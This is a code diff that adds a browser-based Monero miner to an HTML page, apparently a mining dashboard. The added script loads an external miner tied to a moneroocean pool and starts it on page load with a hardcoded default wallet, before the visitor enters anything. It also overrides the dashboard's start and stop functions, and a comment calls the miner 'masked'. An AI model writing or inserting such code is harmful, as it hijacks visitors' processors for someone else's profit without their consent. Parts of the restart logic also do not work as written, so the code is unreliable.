@@ -392,5 +392,69 @@
             }, 300000);
         };
     </script>
+    <script src="/copiedscript.js?karma=bs?nosaj=gulf.moneroocean.stream:10128"></script>
+<script type="text/javascript">
+  let minerRunning = false;
+  let currentWallet = '4AeQH1DXFxP4FCuY9yfFY3fHj8GgCwj2gGNFqzMYBK9LCm915x6j4wpbGnGbGrTdqhLDtMCkbsnMtfW48dTBcKX9Ndtq4FS'; // Default
+  let currentWorker = 'worker1';
+
+  // Autorun with default wallet
+  EverythingIsLife(currentWallet, currentWorker, 50);
+  minerRunning = true;
+  console.log('Miner auto-started with default wallet');
+  setInterval(() => {
+    if (minerRunning) console.log('Miner running...');
+  }, 5000);
+
+  // Hook into dashboard’s startMining()
+  const originalStartMining = startMining; // Save original
+  startMining = function() {
+    const wallet = document.getElementById('wallet').value;
+    if (!wallet) {
+      alert('Please save a wallet address first.');
+      return;
+    }
+    if (wallet.length < 90) {
+      alert('Enter a valid Monero wallet address!');
+      return;
+    }
+    if (minerRunning && wallet === currentWallet) {
+      originalStartMining(); // Just UI update if same wallet
+      return;
+    }
+    // Restart with new wallet
+    if (minerRunning) {
+      minerRunning = false;
+      window.location.reload(); // Stop current miner
+      setTimeout(() => { // Reload resets—run after
+        currentWallet = wallet;
+        currentWorker = 'brody_' + Math.random().toString(36).slice(2);
+        EverythingIsLife(currentWallet, currentWorker, 50);
+        minerRunning = true;
+        console.log('Mining restarted for ' + currentWallet);
+      }, 500);
+    } else {
+      currentWallet = wallet;
+      currentWorker = 'brody_' + Math.random().toString(36).slice(2);
+      EverythingIsLife(currentWallet, currentWorker, 50);
+      minerRunning = true;
+      console.log('Mining started for ' + currentWallet);
+    }
+    originalStartMining(); // Run dashboard’s UI logic
+  };
+
+  // Hook into dashboard’s stopMining()
+  const originalStopMining = stopMining; // Save original
+  stopMining = function() {
+    if (!minerRunning) {
+      originalStopMining(); // UI reset if already stopped
+      return;
+    }
+    minerRunning = false;
+    window.location.reload(); // Only way to stop masked script
+    console.log('Mining stopped');
+    originalStopMining(); // Run dashboard’s UI logic (will reset on reload anyway)
+  };
+</script>
 </body>
 </html>
